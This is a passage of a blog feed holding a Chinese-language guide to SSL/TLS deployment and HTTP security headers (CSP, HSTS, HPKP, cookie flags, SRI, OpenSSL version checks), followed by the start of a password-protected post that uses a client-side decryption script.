不断发展，并支持对增强TLS安全性有用的功能。特别地，它可以用于限制混合内容，当涉及到第三方网站，HSTS没有帮助。</p><p>要部署CSP以防止第三方混合内容，请使用以下配置：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-<span class="string">Policy:</span> <span class="keyword">default</span>-src <span class="string">https:</span> <span class="string">'unsafe-inline'</span> <span class="string">'unsafe-eval'</span>;</span><br><span class="line">                         connect-src <span class="string">https:</span> <span class="string">wss:</span></span><br></pre></td></tr></table></figure></p><blockquote><p>注意<br><br>这不是部署 CSP 的最佳方法。为了提供不破坏混合内容以外的任何内容的示例，我不得不禁用某些默认安全功能。随着时间的推移，当您了解 CSP 的更多信息时，您应该更改您的策略以使其恢复。</p></blockquote><h4 id="1-5-8-不要缓存敏感内容"><a href="#1-5-8-不要缓存敏感内容" class="headerlink" title="1.5.8 不要缓存敏感内容"></a>1.5.8 不要缓存敏感内容</h4><p>所有敏感内容必须仅传达给预定方，并由所有设备进行相应处理。虽然代理没有看到加密的流量，并且不能在用户之间共享内容，但是使用基于云的应用交付平台正在增加，这就是为什么在指定什么是公共的时候需要非常小心的是什么。</p><h4 id="1-5-9-考虑其它威胁"><a href="#1-5-9-考虑其它威胁" class="headerlink" title="1.5.9 考虑其它威胁"></a>1.5.9 考虑其它威胁</h4><p>TLS 旨在仅解决安全机密和您与用户之间通信的完整性的一个方面，但还有许多其他威胁需要处理。在大多数情况下，这意味着确保您的网站没有其他弱点。</p><h3 id="1-6-验证"><a href="#1-6-验证" class="headerlink" title="1.6 验证"></a>1.6 验证</h3><p>有许多配置参数可用于调整，预先知道某些变化会产生什么影响。此外，有时会意外地进行更改; 软件升级可以静默地引入更改。因此，我们建议您最初使用全面的 SSL/TLS 评估工具来验证您的配置，以确保您开始安全，然后定期确保您保持安全。对于公共网站，我们建议您免费使用SSL实验室服务器测试。[6]</p><h4 id="1-6-1-高级主题"><a href="#1-6-1-高级主题" class="headerlink" title="1.6.1 高级主题"></a>1.6.1 高级主题</h4><p>以下高级主题目前不在我们的指南范围之内。他们需要更深入地了解 SSL/TLS 和公钥基础设施（PKI），而且他们仍然被专家辩论。</p><h4 id="1-6-2-使用-HPKP"><a href="#1-6-2-使用-HPKP" class="headerlink" title="1.6.2 使用 HPKP"></a>1.6.2 使用 HPKP</h4><p>公共密钥固定旨在使网站运营商有权限制哪些 CA 可以为其网站颁发证书。Google 已经部署了这个功能了一段时间（硬编码到他们的浏览器，Chrome），并且已被证明是非常有用的，以防止攻击并使公众了解它们。在 2014 年，Firefox 还增加了对硬编码固定的支持。现在可以使用一种称为 HTTP [7]的公钥固定扩展标准。公钥绑定解决了 PKI 最大的弱点（事实上，任何 CA 都可以为任何网站发布证书），但是这是一个成本; 部署需要大量精力和专业知识，并造成失去对您站点控制的风险（如果最终导致无效的固定配置）。你应该考虑固定很大程度上只有当你</p><h4 id="1-6-2-使用-DNSSEC-和-DANE"><a href="#1-6-2-使用-DNSSEC-和-DANE" class="headerlink" title="1.6.2 使用 DNSSEC 和 DANE"></a>1.6.2 使用 DNSSEC 和 DANE</h4><p>域名系统安全扩展（DNSSEC）是一种增加域名系统完整性的技术。今天，一个活跃的网络攻击者可以轻松地劫持任何 DNS 请求并伪造任意的响应。使用 DNSSEC，所有响应都可以加密地跟踪到 DNS 根目录。命名实体的基于 DNS 的身份验证（DANE）是建立在 DNSSEC 之上的单独标准，用于提供 DNS 和 TLS 之间的绑定。DANE 可用于增强现有基于 CA 的 PKI 生态系统的安全性，或者完全绕过它。</p><p>即使不是每个人都同意，DNSSEC 是互联网的一个很好的方向，但对其的支持仍在继续改善。浏览器还不支持 DNSSEC 或 DANE（更喜欢 HSTS 和 HPKP 提供的类似功能），但有一些迹象表明它们正在开始用于提高电子邮件传递的安全性。</p><h2 id="0x02-安全加固"><a href="#0x02-安全加固" class="headerlink" title="0x02 安全加固"></a>0x02 安全加固</h2><p>当你的网站上了 HTTPS 以后，可否觉得网站已经安全了？这里 提供了一个 HTTPS 是否安全的检测工具，你可以试试。</p><p>在线检测工具-<a href="https://myssl.com/" target="_blank" rel="noopener">https://myssl.com/</a></p><p>本篇正文讲述的是 HTTP 安全的最佳实践，着重在于 HTTPS 网站的 Header 的相关配置。</p><h3 id="2-1-连接安全性和加密"><a href="#2-1-连接安全性和加密" class="headerlink" title="2.1 连接安全性和加密"></a>2.1 连接安全性和加密</h3><h4 id="2-1-1-SSL-TLS"><a href="#2-1-1-SSL-TLS" class="headerlink" title="2.1.1 SSL/TLS"></a>2.1.1 SSL/TLS</h4><p>传输层安全（TLS）及其前身安全套接字层（SSL），通过在浏览器和 web 服务器之间提供端到端加密来促进机密通信。没有 TLS，就谈不上什么安全。TLS 是 HTTP 安全性的基础。</p><p>想要部署 TLS 是非常容易的，但其难点在于如何使用安全的配置来保障站点的安全。<br>尤其是 Protocol 版本和 Cipher 需要小心选择和配置。你可以通过<a href="https://myssl.com/" target="_blank" rel="noopener">https://myssl.com/</a>体检你的网站，发现并解决这些细节的问题。</p><blockquote><p>建议<br><br>所有本地和链接的资源需要正确的配置，且要使用 TLS。</p></blockquote><h4 id="2-1-2-HTTP-Strict-Transport-Security-HSTS"><a href="#2-1-2-HTTP-Strict-Transport-Security-HSTS" class="headerlink" title="2.1.2 HTTP Strict Transport Security (HSTS)"></a>2.1.2 HTTP Strict Transport Security (HSTS)</h4><p>指示浏览器只使用 HTTPS 连接到目标服务器。这可以防止一些潜在的中间人攻击，包括 SSL 剥离，会话 cookie 窃取（如果没有被 适当保护）。如果遇到任何与证书相关的错误，它还可以阻止浏览器连接到网站。当浏览器访问一个设置相应 HTTP header 的 HTTPS 网站时，HSTS 将被激活。</p><p>HSTS 有一个固定期限，由 max-age 字段值控制。这个值可以是静态的，也可以是相对于将来某个特定日期的，你可以设置成 SSL 证书的过期时间。</p><p>在浏览器中，HSTS 首选项可以通过提交到 <a href="https://hstspreload.appspot.com" target="_blank" rel="noopener">Chromium’s HSTS preload list</a> 来硬编码，这是所有实现 HSTS 使用的浏览器。</p><p>注意，HSTS 确实有陷阱。它提供了 <code>include subdomains</code> 选项，这在实践中可能是太宽泛了。此外，客户端错误可能会造成严重的后果——客户端错误的时钟导致它认为服务器的 SSL 证书无效或过期，或者缺少根 CA 证书——将不再导致浏览器中的证书错误。浏览器将完全拒绝访问页面，并且可能会显示让安全专家之外的完全无法理解的错误。</p><blockquote><p>建议<br><br>设置 HSTS header 长的生命周期，最好是半年及以上。<br><figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">Strict</span>-Transport-Security: <span class="built_in">max</span>-age=<span class="number">31536000</span></span><br></pre></td></tr></table></figure></p></blockquote><h4 id="2-1-3-Public-Key-Pins"><a href="#2-1-3-Public-Key-Pins" class="headerlink" title="2.1.3 Public Key Pins"></a>2.1.3 Public Key Pins</h4><p>HTTP PKP（HPKP）指示浏览器只与提供的 SSL/TLS 的 HASH 相符或存在于同一证书链的服务器相连接。换句话说，如果 SSL/TLS 证书以一种意想不到的方式发生了变化，浏览器就无法连接到主机。这主要是针对受信任证书颁发机构（CA）或流氓 CA 证书颁发的伪造证书，用户可能会被骗安装。</p><p>例如，浏览器连接到 <a href="https://example.com，它存在这个头。header" target="_blank" rel="noopener">https://example.com，它存在这个头。header</a> 告诉浏览器，如果证书 key 匹配，或者在发出证书链中有一个 key 匹配，那么在将来才会再次连接。其他的指令组合是可能的。它们都极大地减少了攻击者在客户端和合法主机之间模拟主机或拦截通信的可能性。</p><p>像 HSTS 一样，HPKP 在实现之前需要仔细的思考和计划。错误可以将用户锁定在您的站点之外，并且不容易修复。</p><p>像 HSTS 一样，HPKP 在实现之前需要仔细的思考和计划。错误可以将用户锁定在您的站点之外，并且不容易修复。</p><blockquote><p>建议<br><br>确定是否需要为您的站点使用 PKP。如果是这样的话，那么从一个较小的实践开始，如果在一段时间之后没有遇到问题，就增加它。如果 SSL/TLS 密钥需要更新，建立备份计划。优先创建备份密钥和离线存储。</p></blockquote><p>示例HTTP头:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Public-Key-Pins: <span class="attribute">max-age</span>=5184000; <span class="attribute">pin-sha256</span>=<span class="string">"+oZq/vo3Kcv0CQPjpdwyInqVXmLiobmUJ3FaDpD/U6c="</span>; <span class="attribute">pin-sha256</span>=<span class="string">"47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU="</span></span><br></pre></td></tr></table></figure></p><h4 id="2-1-4-Mixed-HTTPS-and-HTTP-Content"><a href="#2-1-4-Mixed-HTTPS-and-HTTP-Content" class="headerlink" title="2.1.4 Mixed HTTPS and HTTP Content"></a>2.1.4 Mixed HTTPS and HTTP Content</h4><p>主站点通过 HTTPS 安全地服务，但是在 HTTP 上加载一些文件（images、js、css）。这是一个巨大的安全漏洞，破坏了 HTTPS 提供的安全性。受影响的站点可能会泄漏会话 cookie 或用户行为信息。它们也可能容易受到注入和其他 MITM 攻击的攻击，而 HTTPS 通常会阻止这种攻击。</p><blockquote><p>建议<br><br>如果 HTTPS 部署在主站上，请将任何地方的所有内容都 HTTPS 化（全站 HTTPS）。</p></blockquote><h3 id="2-2-Content-security"><a href="#2-2-Content-security" class="headerlink" title="2.2 Content security"></a>2.2 Content security</h3><h4 id="2-2-1-Content-Security-Policy"><a href="#2-2-1-Content-Security-Policy" class="headerlink" title="2.2.1 Content Security Policy"></a>2.2.1 Content Security Policy</h4><p>为浏览器提供关于网站内容类型和行为的明确说明。良好的内容安全策略（CSP）可以帮助抵御跨站点脚本（XSS）和其他注入攻击等攻击。CSP 支持所有主要的浏览器，尽管只是部分地之前在 IE 11。</p><p>一个好的 CSP 是基于白名单的方法，不允许任何东西，除了明确允许的内容。它还限制了 javascript 的来源和允许操作。</p><p>CSP 很难启用遗留代码库。为了简化实现，CSP 提供了一个 <code>report-only</code> 模式，在浏览器中，CSP 的违规被发送到一个网站端点，但是该策略没有被强制执行。<br>新项目应该从一开始就使用 CSP。</p><blockquote><p>建议<br><br>从限制性政策开始，在必要时放松。禁止所有的例子:<br><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: <span class="keyword">default-src</span> <span class="string">'none'</span>;</span><br></pre></td></tr></table></figure></p></blockquote><p>现在让我们允许自托管 scripts、images、CSS、fonts 和 AJAX，以及 jQuery CDN 托管脚本和 Google Analytics:<br><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: <span class="keyword">default-src</span> <span class="string">'none'</span>; <span class="keyword">script-src</span> <span class="string">'self'</span> https://code.jquery.com https://www.google-analytics.com; <span class="keyword">img-src</span> <span class="string">'self'</span> https://www.google-analytics.com; <span class="keyword">connect-src</span> <span class="string">'self'</span>; <span class="keyword">font-src</span> <span class="string">'self'</span>; <span class="keyword">style-src</span> <span class="string">'self'</span>;</span><br></pre></td></tr></table></figure></p><p>要注意的是，不要让所有的东西都破坏你的网站，例如，如果你使用 <code>child-src</code> 指令，而浏览器不支持它。一个不那么严格的政策可能从以下开始:<br><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: <span class="keyword">default-src</span> <span class="string">'self'</span>;</span><br></pre></td></tr></table></figure></p><p>甚至更少的限制性政策甚至可以使用<code>default-src &#39;*&#39;</code>，然后添加限制。我建议你不要这么做，除非你完全明白其中的含义。否则，你可能会依赖 CSP，它只会给你一种错误的安全感。</p><h4 id="2-2-2-Frame-Options"><a href="#2-2-2-Frame-Options" class="headerlink" title="2.2.2 Frame Options"></a>2.2.2 Frame Options</h4><p>控制站点是否可以放置在 <code>&lt;iframe&gt;</code>，<code>&lt;frame&gt;</code> 或 <code>&lt;object&gt;</code> 标签。不允许使用框架可以防止 clickjacking 攻击。例如，从 2015 年 2 月起，<a href="https://thehackernews.com/2015/02/internet-explorer-xss.html" target="_blank" rel="noopener">Internet Explorer’s universal cross-site-scripting bug</a> 就被这个消息头减轻了。</p><p><code>X-Frame-Options</code> 是一个非标准的 header，在内容安全策略级别 2 中被 frame ancestor 指令所取代。然而，frame ancestor 还没有得到普遍的支持，而 <code>X-Frame-Options</code> 得到了广泛的支持。</p><blockquote><p>建议<br><br>确定你的网站是否需要被允许呈现在一个 frame 中。完全不允许使用 sameorigin 拒绝或允许同源框架的选项。避免由于受限或 bug 浏览器支持而允许的选项。示例 HTTP 头:<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-<span class="keyword">Frame</span>-<span class="keyword">Options</span>: deny</span><br></pre></td></tr></table></figure></p></blockquote><h4 id="2-2-3-XSS-Protection"><a href="#2-2-3-XSS-Protection" class="headerlink" title="2.2.3 XSS Protection"></a>2.2.3 XSS Protection</h4><p>跨站点脚本（XSS 或 CSS）的保护被构建到大多数流行的浏览器中，除了 Firefox 之外。这种保护是用户可配置的，可以关闭。因此，明确要求浏览器在你的网站上使用它的 XSS 过滤器是个好主意。</p><p>相反，网站可以要求 XSS 保护在页面的基础上被禁用。这绝对不是一个好主意。</p><blockquote><p>建议<br><br>使用入校 HTTP header:<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Xss-Protection: <span class="number">1</span>; block</span><br></pre></td></tr></table></figure></p></blockquote><h4 id="2-2-4-Cache-Control"><a href="#2-2-4-Cache-Control" class="headerlink" title="2.2.4 Cache Control"></a>2.2.4 Cache Control</h4><p>表示缓存页面输出的首选项。适当的值随网站数据的性质而变化，但强烈推荐使用偏好。否则，它取决于浏览器和代理来选择是否缓存内容。不恰当的选择可能会导致性能问题、安全问题，或者两者都有。</p><blockquote><p>建议<br><br>开发缓存策略，然后将缓存首选项包括为 HTTP 头。<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-<span class="string">Control:</span> <span class="keyword">public</span>*</span><br></pre></td></tr></table></figure></p></blockquote><p>其中的一个 public，private，no-cache 或 no-store。如果允许缓存，则应该将 max-age 值包含在 Cache-Control 以及 Etag 头文件中，以允许客户端缓存验证。</p><h4 id="2-2-5-Content-Type-Options"><a href="#2-2-5-Content-Type-Options" class="headerlink" title="2.2.5 Content Type Options"></a>2.2.5 Content Type Options</h4><p>当浏览器以不同的方式处理来自服务器的文件时，MIME 嗅探就是服务器指令。当一个网站承载不受信任的内容（如用户提供的）时，这是很危险的。假设服务器允许用户上传 image。如果用户上传 HTML 文档，浏览器可能会将其呈现为 web 执行 scriptpage，即使服务器明确表示正在发送 image。非标准的标头 <code>X-Content-Type-Options</code> 选项指示浏览器不做任何模仿指定类型的 MIME。</p><blockquote><p>建议<br><br>总是设置 header:<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Content-<span class="keyword">Type</span>-<span class="keyword">Options</span>: nosniff</span><br></pre></td></tr></table></figure></p></blockquote><h4 id="2-2-6-Subresource-Integrity"><a href="#2-2-6-Subresource-Integrity" class="headerlink" title="2.2.6 Subresource Integrity"></a>2.2.6 Subresource Integrity</h4><p>浏览器通常从外部域加载大量资源、javascript 和样式表。内容交付网络经常被使用。如果外部资源被破坏，依赖站点的安全性也可以。子资源完整性允许浏览器验证 javascript 或样式表未被意外修改。</p><blockquote><p>建议<br><br>设置外部 javascript 和样式表的完整性属性。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"</span> integrity=<span class="string">"sha384-6ePHh72Rl3hKio4HiJ841psfsRJveeS+aLoaEf3BWfS+gTF0XdAqku2ka8VddikM"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>注意<br><br>您应该始终提供外部脚本的本地副本，并实现一种方法，以便在外部负载失败的情况下重新加载它们。否则你的网站可能会崩溃。例子:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.jQuery || <span class="built_in">document</span>.write(<span class="string">'&lt;script src="/jquery.min.js"&gt;&lt;\/script&gt;'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote><h4 id="2-2-7-Iframe-Sandbox"><a href="#2-2-7-Iframe-Sandbox" class="headerlink" title="2.2.7 Iframe Sandbox"></a>2.2.7 Iframe Sandbox</h4><p>iframe 在 WWW 上随处可见。网站平均有 5.1 iframe，主要用于装载第三方内容。这些 iframe 有很多方法来伤害托管网站，包括运行脚本和插件和重新引导访问者。sandbox 属性允许对 iframe 中可以进行的操作进行限制。</p><blockquote><p>建议<br><br>设置 iframe 的 sandbox 属性，然后添加所需的权限。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"https://example.com"</span> sandbox=<span class="string">"allow-same-origin allow-scripts"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p></blockquote><h4 id="2-2-8-Server-Clock"><a href="#2-2-8-Server-Clock" class="headerlink" title="2.2.8 Server Clock"></a>2.2.8 Server Clock</h4><p>服务器包括所有响应的时间戳。不准确的时钟不会给客户机浏览器带来问题。然而，当与其他系统或服务交互时，问题就会出现。</p><blockquote><p>建议<br><br>使用网络时间协议（NTP）来保持服务器时钟的准确性。</p></blockquote><h3 id="2-3-Information-disclosure"><a href="#2-3-Information-disclosure" class="headerlink" title="2.3 Information disclosure"></a>2.3 Information disclosure</h3><h4 id="2-3-1-Server-Banner"><a href="#2-3-1-Server-Banner" class="headerlink" title="2.3.1 Server Banner"></a>2.3.1 Server Banner</h4><p>大多数 web 服务器设置报头来识别自己和他们的版本号。这只服务于信息目的和实际用途是非常有限的。去掉整个头，而完全可以接受，通常是不必要的。但是，建议从头中删除版本号。在特定 web 服务器版本中存在 bug 的情况下，包括版本号可以作为对脚本 kiddy 的邀请来尝试对服务器的攻击。</p><blockquote><p>建议<br><br>包含服务器名称但去掉版本号；<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Server</span>: nginx</span><br></pre></td></tr></table></figure></p></blockquote><h4 id="2-3-2-Web-Framework-Information"><a href="#2-3-2-Web-Framework-Information" class="headerlink" title="2.3.2 Web Framework Information"></a>2.3.2 Web Framework Information</h4><p>许多 web 框架设置 HTTP 头，识别框架或版本号。除了满足用户的好奇心，而且主要作为技术堆栈的广告，这几乎没有什么作用。这些头是不标准的，对浏览器渲染站点的方式没有影响。</p><p>虽然它们没有什么实际用途，但对于搜索运行过时版本的软件的机器人或蜘蛛来说，这些标头是无价的，因为这些软件可能包含安全漏洞。如果没有定期更新，这些头文件可以使网站的目标变得容易。</p><blockquote><p>建议<br><br>从服务器响应中删除这些标头: <code>X-Powered-By</code>, <code>X-Runtime</code>, <code>X-Version</code> 和 <code>X-AspNet-Version</code>。</p></blockquote><h3 id="2-4-Cookies"><a href="#2-4-Cookies" class="headerlink" title="2.4 Cookies"></a>2.4 Cookies</h3><h4 id="2-4-1-Cookie-Security"><a href="#2-4-1-Cookie-Security" class="headerlink" title="2.4.1 Cookie Security"></a>2.4.1 Cookie Security</h4><p>包含敏感信息的 cookie，特别是会话 id，需要标记为安全的，假设网站是通过 HTTPS 传输的。这会阻止 cookie 通过 HTTP 发送明文文本。另一种方法是通过 HSTS 来阻止非安全 cookie 在 HTTP 上传输。建议使用安全 cookie 和 HSTS。</p><p>会话 cookie 应该与 HttpOnly 值进行标记，以防止它们被 javascript 访问。这可以防止攻击者利用 XSS 窃取会话 cookie。其他 cookie 可能不需要这样标记。但是，除非有明确的需要从 javascript 中访问他们的值，否则最好还是呆在安全的一边，把所有cookie标记为 HttpOnly</p><blockquote><p>建议<br><br>标记所有 cookie 安全和 HttpOnly。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: <span class="attribute">Key</span>=Value; <span class="attribute">path</span>=/; secure; HttpOnly, <span class="attribute">Key2</span>=Value2; secure; HttpOnly</span><br></pre></td></tr></table></figure></p></blockquote><h2 id="0x03-服务器软件安全"><a href="#0x03-服务器软件安全" class="headerlink" title="0x03 服务器软件安全"></a>0x03 服务器软件安全</h2><p>我们在最佳实践文章中建议大家如何去配置协议和密码套件，但是如果服务器软件（nginx、apache等）所使用的ssl协议库存在SSL漏洞，或者不支持那些现代化的密码套件和特性，那么无论你如何去修改配置都无法改善现在的安全问题。</p><p>所以我们在配置前，或者发现按照推荐配置进行了调整《<a href="https://myssl.com/" target="_blank" rel="noopener">SSL/TLS安全评估报告</a>》还是无法满足要求，那么可以检查下所使用的OpenSSL等加密库是否版本过低。</p><h3 id="3-1-如何检查OpenSSL版本"><a href="#3-1-如何检查OpenSSL版本" class="headerlink" title="3.1 如何检查OpenSSL版本"></a>3.1 如何检查OpenSSL版本</h3><h4 id="3-1-1-nginx"><a href="#3-1-1-nginx" class="headerlink" title="3.1.1 nginx"></a>3.1.1 nginx</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nginx -V</span><br><span class="line"></span><br><span class="line">nginx <span class="built_in">version</span>: nginx/<span class="number">1.10</span><span class="number">.2</span></span><br><span class="line">built <span class="keyword">by</span> gcc <span class="number">4.8</span><span class="number">.5</span> <span class="number">20150623</span> (Red Hat <span class="number">4.8</span><span class="number">.5</span><span class="number">-4</span>) (GCC)</span><br><span class="line">built <span class="keyword">with</span> OpenSSL <span class="number">1.0</span><span class="number">.1</span>e-fips <span class="number">11</span> Feb <span class="number">2013</span></span><br><span class="line">TLS SNI support enabled</span><br></pre></td></tr></table></figure><p>或者通过openssl命令查看(适用于非自己通过openssl源码编译的）<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl <span class="built_in">version</span></span><br></pre></td></tr></table></figure></p><p>推荐的OpenSSL版本</p><ol><li>OpenSSL 1.0.2用户需更新到1.0.2h 以上。</li><li>OpenSSL 1.0.1用户需更新到1.0.1t 以上。</li><li>OpenSSL官方已停止对 0.9.8和 1.0.0 两个版本的升级维护，请使用这两个版本的用户将其升级至1.0.2h版本以上。</li></ol><blockquote><p>OpenSSL 1.0.1以下不支持tls1.2<br><br>升级前请做好测试</p></blockquote><h3 id="3-2-漏洞事件"><a href="#3-2-漏洞事件" class="headerlink" title="3.2 漏洞事件"></a>3.2 漏洞事件</h3><p><a href="https://www.trustasia.com/openssl-heartbleed" target="_blank" rel="noopener">https://www.trustasia.com/openssl-heartbleed</a></p><ul><li>OpenSSL 1.0.1g 已修复该漏洞</li><li>OpenSSL 1.0.0 分支版本不受此漏洞影响</li><li>OpenSSL 0.9.8 分支版本不受此漏洞影响</li><li>OpenSSL 1.0.2 Beta2 不受此漏洞影响<br><a href="https://myssl.com/heartbleed.html" target="_blank" rel="noopener">Heartbleed检测工具(使用多个工具测试，防止误报)</a></li></ul><p><a href="https://www.trustasia.com/OpenSSL-DROWN-attack" target="_blank" rel="noopener">https://www.trustasia.com/OpenSSL-DROWN-attack</a></p><ul><li>OpenSSL 1.0.1h+</li><li>OpenSSL 1.0.0m+</li><li>OpenSSL 0.9.8za+</li></ul><p><a href="https://www.trustasia.com/OpenSSL-CVE-2016-2107-Padding-Oracle" target="_blank" rel="noopener">https://www.trustasia.com/OpenSSL-CVE-2016-2107-Padding-Oracle</a></p><ul><li>OpenSSL 1.0.2用户需更新到1.0.2h 。</li><li>OpenSSL 1.0.1用户需更新到1.0.1t 。</li><li>使用包管理系统的用户可以直接更新到2016年5月3日 之后的版本。<br><a href="https://myssl.com/cbc_oracle.html" target="_blank" rel="noopener">CBC padding oracle检测 检测工具&gt;&gt;</a></li></ul><p>OpenSSL CCS漏洞<br><br>此漏洞是 OpenSSL ChangeCipherSpec 设计缺陷造成，被称为 CCS 注入漏洞。<br><br><a href="https://www.trustasia.com/openssl-ccs" target="_blank" rel="noopener">https://www.trustasia.com/openssl-ccs</a></p><ul><li>OpenSSL 1.1.0 应升级到 1.1.0a 或更高版本。</li><li>OpenSSL 1.0.2 应升级到 1.0.2i 或更高版本。</li><li>OpenSSL 1.0.1 应升级到 1.0.1u 或更高版本。<br><a href="https://myssl.com/ccs.html" target="_blank" rel="noopener">OpenSSL CCS 检测工具&gt;&gt;</a></li></ul><blockquote><p>注意：<br><br>OpenSSL官方已停止对 0.9.8和 1.0.0 两个版本的升级维护，请使用这两个版本的用户将其升级至更高版本。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;原文：&lt;a href=&quot;https://blog.myssl.com/ssl-and-tls-deployment-best-practices/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.myssl.com/ssl-and-tls-deployment-best-practices/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;SSL/TLS 是一种简单易懂的技术，它很容易部署及运行。但想要部署的安全通常是不容易的。这也使系统管理员和开发者不得不去了解 SSL 和 TLS 相关的技术，掌握如何配置一个安全的 web 服务器或应用。无疑会耗费很大的精力去看相关的技术文档，乏味且宽泛。&lt;/p&gt;
&lt;p&gt;本篇文档的目的在于如何让系统管理员或开发者用尽可能少的时间部署一个安全的 web 站点或应用，即 SSL 和 TLS 部署最佳实践。&lt;/p&gt;
&lt;h2 id=&quot;0x01-SSL-TLS部署&quot;&gt;&lt;a href=&quot;#0x01-SSL-TLS部署&quot; class=&quot;headerlink&quot; title=&quot;0x01 SSL/TLS部署&quot;&gt;&lt;/a&gt;0x01 SSL/TLS部署&lt;/h2&gt;&lt;h3 id=&quot;1-1-证书和私钥&quot;&gt;&lt;a href=&quot;#1-1-证书和私钥&quot; class=&quot;headerlink&quot; title=&quot;1.1 证书和私钥&quot;&gt;&lt;/a&gt;1.1 证书和私钥&lt;/h3&gt;&lt;p&gt;在TLS中，所有的安全性都从服务器的密码标识开始；需要一个强大的私钥来防止攻击者进行模拟攻击。同样重要的是要有一个有效的和强大的证书，这将授予私有密匙作为一个特定主机名的权利。没有这两个基本的构建块，就没有其他东西可以安全了。&lt;/p&gt;
&lt;h4 id=&quot;1-1-1-使用-2048-位私钥&quot;&gt;&lt;a href=&quot;#1-1-1-使用-2048-位私钥&quot; class=&quot;headerlink&quot; title=&quot;1.1.1 使用 2048 位私钥&quot;&gt;&lt;/a&gt;1.1.1 使用 2048 位私钥&lt;/h4&gt;&lt;p&gt;对于大多数的 web 站点，提供一个 2048 的 RSA key 是足够安全的。
    
    </summary>
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="HTTPS" scheme="http://www.pa55w0rd.club/tags/HTTPS/"/>
    
  </entry>
  
  <entry>
    <title>encrypt_test</title>
    <link href="http://www.pa55w0rd.club/encrypt-test/"/>
    <id>http://www.pa55w0rd.club/encrypt-test/</id>
    <published>2018-12-05T08:47:53.000Z</published>
    <updated>2018-12-05T08:49:54.991Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" 